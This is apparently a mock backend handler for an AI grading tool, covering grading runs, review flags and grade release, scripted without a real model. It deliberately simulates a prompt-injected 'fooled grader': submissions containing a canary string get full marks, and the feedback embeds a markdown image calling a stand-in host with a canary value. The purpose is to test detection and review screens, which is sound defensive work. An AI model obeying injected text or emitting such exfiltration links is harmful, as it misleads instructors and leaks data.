/**
 * MOCK(C4)/MOCK(C5) grading runs and review detail, MOCK(D3) approve-and-release,
 * scripted like the fake model (01-interfaces.md §6): no model is involved.
 *
 * Follows §7 where it matters for the screens:
 * - objective criteria are marked by code against the key (C20);
 * - two attempts per open criterion; proposed score = mean rounded down to 0.5;
 * - quotes are checked verbatim against the text (whitespace normalised);
 * - citations are extracted by code (http(s) URLs, at most 5, the sentence
 *   around each as the claim);
 * - flags: full_marks, disagreement, quote_not_found, citation_not_supported,
 *   and outlier computed when the review screen loads;
 * - totals are computed by code from the scores.
 * The submission with the CANARY-T04 line plays a fooled grader (full marks).
 */
import type { ReleasedGrade } from "../types/content";
import type {
  ApproveResponse,
  CriterionReview,
  ExtractedText,
  GradeFlag,
  ProposedGradeDetail,
  ProposedGradeRow,
  StartRunResponse,
} from "../types/grading";
import { visibleAssignment } from "./access";
import { error, isRecord, json, route, type MockContext, type MockHandler } from "./http";
import { MOCK_USERS, type MockAssignment, type MockProposedGrade, type MockSubmission, type MockWorld } from "./state";

const floorHalf = (n: number) => Math.floor(n * 2) / 2;
const clamp = (n: number, max: number) => Math.min(Math.max(n, 0), max);
const normalise = (t: string) => t.replace(/\s+/g, " ").trim();
const isHalfStep = (n: number) => Number.isFinite(n) && (n * 2) % 1 === 0;

function sentences(text: string): string[] {
  return text
    .split(/(?<=[.!?])\s+|\n+/)
    .map((x) => x.trim())
    .filter(Boolean);
}

function expectedLabel(a: MockAssignment, criterionId: string): string {
  const e = a.answerKey?.entries.find((x) => x.criterion_id === criterionId)?.expected;
  if (!e) return "no key";
  return e.type === "choice" ? e.value : `${e.value} ± ${e.tolerance}`;
}

function markObjective(a: MockAssignment, s: MockSubmission, criterionId: string): number {
  const criterion = a.criteria.find((c) => c.id === criterionId)!;
  const expected = a.answerKey?.entries.find((e) => e.criterion_id === criterionId)?.expected;
  const answer = (s.objective_answers[criterionId] ?? "").trim();
  if (!expected || !answer) return 0;
  if (expected.type === "choice") return answer.toUpperCase() === expected.value.toUpperCase() ? criterion.max_points : 0;
  const n = Number(answer);
  return Number.isFinite(n) && Math.abs(n - expected.value) <= expected.tolerance ? criterion.max_points : 0;
}

/** §7: URLs extracted by code, never chosen by a model; at most 5. */
function extractCitations(text: string): { url: string; claim: string }[] {
  const out: { url: string; claim: string }[] = [];
  for (const sentence of sentences(text)) {
    for (const m of sentence.matchAll(/https?:\/\/[^\s)]+/g)) {
      if (out.length < 5) out.push({ url: m[0], claim: sentence });
    }
  }
  return out;
}

function gradeSubmission(world: MockWorld, a: MockAssignment, s: MockSubmission, index: number): MockProposedGrade {
  const fooled = s.body_text.includes("CANARY-T04"); // scripted "fooled grader" for the demo
  const words = s.body_text.split(/\s+/).filter(Boolean).length;
  const parts = sentences(s.body_text);
  const attempt1: Record<string, number> = {};
  const attempt2: Record<string, number> = {};
  const proposed: Record<string, number> = {};
  const feedback: Record<string, string> = {};
  const quotes: Record<string, string[]> = {};
  const flags = new Set<GradeFlag>();

  a.criteria.forEach((c, i) => {
    if (c.kind === "objective") {
      const mark = markObjective(a, s, c.id);
      attempt1[c.id] = attempt2[c.id] = proposed[c.id] = mark;
      return;
    }
    const base = fooled ? c.max_points : clamp(floorHalf(words / 12 + i), c.max_points);
    const second = index === 1 && i === 1 ? clamp(base - 1.5, c.max_points) : base; // one scripted disagreement
    attempt1[c.id] = base;
    attempt2[c.id] = second;
    proposed[c.id] = floorHalf((base + second) / 2);
    if (Math.abs(base - second) > 1) flags.add("disagreement");
    feedback[c.id] = fooled
      ? "Excellent work on every point. ![badge](https://canary.example/?d=CANARY-T09-4e2f)"
      : "**Partly meets the criterion.** The answer names the idea; explain *why* it matters for grading.";
    quotes[c.id] = [parts[i] ?? parts[0] ?? ""].filter(Boolean);
    // One scripted quote that is not in the text, so quote_not_found can be shown.
    if (index === 1 && i === 2) quotes[c.id]!.push("Labels are a complete defence against prompt injection.");
  });

  const text = normalise(s.body_text);
  if (Object.values(quotes).some((qs) => qs.some((q) => !text.includes(normalise(q))))) flags.add("quote_not_found");

  const citations = extractCitations(s.body_text).map((c) => ({
    ...c,
    // Scripted evidence-checker verdict: the seeded OWASP-like page doesn't back the claim.
    verdict: new URL(c.url).hostname.endsWith("owasp.example") ? ("does_not_support" as const) : ("supports" as const),
  }));
  if (citations.some((c) => c.verdict !== "supports")) flags.add("citation_not_supported");

  const max_total = a.criteria.reduce((sum, c) => sum + c.max_points, 0);
  const total = a.criteria.reduce((sum, c) => sum + (proposed[c.id] ?? 0), 0);
  if (total === max_total && max_total > 0) flags.add("full_marks");

  return {
    id: world.newId(),
    assignment_id: a.id,
    submission_id: s.id,
    attempts: [attempt1, attempt2],
    proposed,
    feedback,
    flags: [...flags],
    total,
    max_total,
    status: "pending",
    released_at: null,
    quotes,
    citations,
    changes: [],
  };
}

/** §7: outlier = total more than two standard deviations from the assignment mean, computed on load. */
function outliers(world: MockWorld, assignmentId: string): Set<string> {
  const grades = world.proposed.filter((g) => g.assignment_id === assignmentId && g.status !== "rejected");
  if (grades.length < 3) return new Set();
  const mean = grades.reduce((s, g) => s + g.total, 0) / grades.length;
  const sd = Math.sqrt(grades.reduce((s, g) => s + (g.total - mean) ** 2, 0) / grades.length);
  return new Set(grades.filter((g) => sd > 0 && Math.abs(g.total - mean) > 2 * sd).map((g) => g.id));
}

function flagsWithOutlier(g: MockProposedGrade, outlierIds: Set<string>): GradeFlag[] {
  return outlierIds.has(g.id) && !g.flags.includes("outlier") ? [...g.flags, "outlier"] : [...g.flags];
}

function toRow(world: MockWorld, g: MockProposedGrade, outlierIds: Set<string>): ProposedGradeRow {
  const s = world.submissions.find((x) => x.id === g.submission_id);
  const student = MOCK_USERS.find((u) => u.id === s?.student_id);
  return {
    id: g.id,
    submission_id: g.submission_id,
    student: { id: student?.id ?? "", display_name: student?.display_name ?? "Unknown student" },
    total: g.total,
    max_total: g.max_total,
    status: g.status,
    flags: flagsWithOutlier(g, outlierIds),
  };
}

/** The released grade a student may see, or null before release (R10). */
export function releasedGradeFor(world: MockWorld, a: MockAssignment, submissionId: string): ReleasedGrade | null {
  const g = world.proposed.find((x) => x.submission_id === submissionId && x.status === "released");
  if (!g || !g.released_at) return null;
  return {
    total: g.total,
    max_total: g.max_total,
    released_at: g.released_at,
    criteria: a.criteria.map((c) => ({
      criterion_id: c.id,
      label: c.label,
      kind: c.kind,
      max_points: c.max_points,
      score: g.proposed[c.id] ?? 0,
      feedback: g.feedback[c.id] ?? null,
    })),
  };
}

/**
 * For routes addressed by a submission or proposed-grade ID: anyone who isn't
 * an instructor of that course gets 404, never 403, so a student can't learn
 * that another student's record exists (the E_NOT_FOUND rule in §5).
 */
function instructorRecord(ctx: MockContext, assignmentId: string | undefined): MockAssignment | Response {
  if (ctx.user.role !== "instructor") return error(404, "not_found");
  return instructorAssignment(ctx, assignmentId);
}

function instructorAssignment(ctx: MockContext, id: string | undefined): MockAssignment | Response {
  const a = visibleAssignment(ctx, id);
  if (!a) return error(404, "not_found");
  if (ctx.user.role !== "instructor") return error(403, "forbidden");
  return a;
}

/** Validates score_changes against the grades being approved; null if anything is off. */
function parseScoreChanges(
  ctx: MockContext,
  raw: unknown,
  grades: MockProposedGrade[],
): Map<MockProposedGrade, Record<string, number>> | null {
  const out = new Map<MockProposedGrade, Record<string, number>>();
  if (raw === undefined) return out;
  if (!isRecord(raw)) return null;
  for (const [gradeId, perCriterion] of Object.entries(raw)) {
    const g = grades.find((x) => x.id === gradeId);
    const a = g && ctx.world.assignments.find((x) => x.id === g.assignment_id);
    if (!g || !a || !isRecord(perCriterion)) return null;
    const scores: Record<string, number> = {};
    for (const [criterionId, score] of Object.entries(perCriterion)) {
      const c = a.criteria.find((x) => x.id === criterionId);
      // E_RANGE in §5 terms: within the criterion's maximum, in steps of 0.5 (§7).
      if (!c || typeof score !== "number" || score < 0 || score > c.max_points || !isHalfStep(score)) return null;
      scores[criterionId] = score;
    }
    out.set(g, scores);
  }
  return out;
}

export const gradingHandler: MockHandler = (req, ctx) => {
  let p: Record<string, string> | null;

  // MOCK(C4): §10 POST /assignments/{id}/grading-runs
  if ((p = route("POST", "/api/assignments/:id/grading-runs", req))) {
    const a = instructorAssignment(ctx, p.id);
    if (a instanceof Response) return a;
    if (a.status !== "published") return error(400, "invalid_request");
    const run = { id: ctx.world.newId(), assignment_id: a.id, started_at: new Date(ctx.now()).toISOString() };
    ctx.world.runs.push(run);
    // Grade every submission that has no live proposed grade yet.
    const todo = ctx.world.submissions.filter(
      (s) => s.assignment_id === a.id && !ctx.world.proposed.some((g) => g.submission_id === s.id && g.status !== "rejected"),
    );
    todo.forEach((s, i) => ctx.world.proposed.push(gradeSubmission(ctx.world, a, s, i)));
    const body: StartRunResponse = { run_id: run.id, submissions: todo.length };
    return json(201, body);
  }

  // MOCK(C4): §10 GET /assignments/{id}/proposed-grades
  if ((p = route("GET", "/api/assignments/:id/proposed-grades", req))) {
    const a = instructorAssignment(ctx, p.id);
    if (a instanceof Response) return a;
    const out = outliers(ctx.world, a.id);
    const rows = ctx.world.proposed.filter((g) => g.assignment_id === a.id).map((g) => toRow(ctx.world, g, out));
    return json(200, rows);
  }

  // MOCK(C5): ASSUMED route GET /proposed-grades/{id} (review detail, C36)
  if ((p = route("GET", "/api/proposed-grades/:id", req))) {
    const g = ctx.world.proposed.find((x) => x.id === p!.id);
    const a = g ? instructorRecord(ctx, g.assignment_id) : error(404, "not_found");
    if (a instanceof Response) return a;
    const s = ctx.world.submissions.find((x) => x.id === g!.submission_id)!;
    const text = normalise(s.body_text);
    const criteria: CriterionReview[] = a.criteria.map((c) => ({
      criterion_id: c.id,
      label: c.label,
      kind: c.kind,
      max_points: c.max_points,
      attempt1: g!.attempts[0][c.id] ?? 0,
      attempt2: g!.attempts[1][c.id] ?? 0,
      proposed: g!.proposed[c.id] ?? 0,
      feedback: g!.feedback[c.id] ?? null,
      quotes: (g!.quotes[c.id] ?? []).map((q) => ({ text: q, found: text.includes(normalise(q)) })),
      objective:
        c.kind === "objective"
          ? { answer: s.objective_answers[c.id] ?? null, expected: expectedLabel(a, c.id), mark: g!.proposed[c.id] ?? 0 }
          : null,
    }));
    const body: ProposedGradeDetail = {
      ...toRow(ctx.world, g!, outliers(ctx.world, a.id)),
      assignment_id: a.id,
      assignment_title: a.title,
      criteria,
      citations: g!.citations.map((c) => ({ ...c })),
    };
    return json(200, body);
  }

  // MOCK(D6): §10 GET /submissions/{id}/extracted-text (instructor only, C36)
  if ((p = route("GET", "/api/submissions/:id/extracted-text", req))) {
    const s = ctx.world.submissions.find((x) => x.id === p!.id);
    const a = s ? instructorRecord(ctx, s.assignment_id) : error(404, "not_found");
    if (a instanceof Response) return a;
    const body: ExtractedText = { submission_id: s!.id, text: s!.body_text };
    return json(200, body);
  }

  // MOCK(D3): §10 POST /proposed-grades/approve (re-auth, C28); approving releases (ASSUMED)
  if (route("POST", "/api/proposed-grades/approve", req)) {
    if (ctx.user.role !== "instructor") return error(403, "forbidden");
    if (!ctx.reauthFresh()) return error(401, "reauth_required");
    const body = isRecord(req.body) ? req.body : {};
    const ids = body.proposed_grade_ids;
    if (!Array.isArray(ids) || ids.length === 0 || !ids.every((x) => typeof x === "string")) return error(400, "invalid_request");
    const grades = ids.map((id) => ctx.world.proposed.find((g) => g.id === id));
    // All or nothing: every ID must be a pending grade in a course this instructor teaches.
    for (const g of grades) {
      if (!g || g.status !== "pending" || !visibleAssignment(ctx, g.assignment_id)) return error(404, "not_found");
    }
    const valid = grades as MockProposedGrade[];
    const changes = parseScoreChanges(ctx, body.score_changes, valid);
    // A score outside 0..max or off the 0.5 grid (E_RANGE in MCP terms, §5) rejects the whole request.
    if (!changes) return error(400, "invalid_request");
    const at = new Date(ctx.now()).toISOString();
    for (const g of valid) {
      for (const [criterionId, after] of Object.entries(changes.get(g) ?? {})) {
        const before = g.proposed[criterionId] ?? 0;
        if (before !== after) {
          g.changes.push({ criterion_id: criterionId, before, after });
          g.proposed[criterionId] = after;
        }
      }
      g.total = Object.values(g.proposed).reduce((sum, n) => sum + n, 0);
      g.status = "released";
      g.released_at = at;
    }
    const response: ApproveResponse = { released: valid.length };
    return json(200, response);
  }

  return undefined;
};
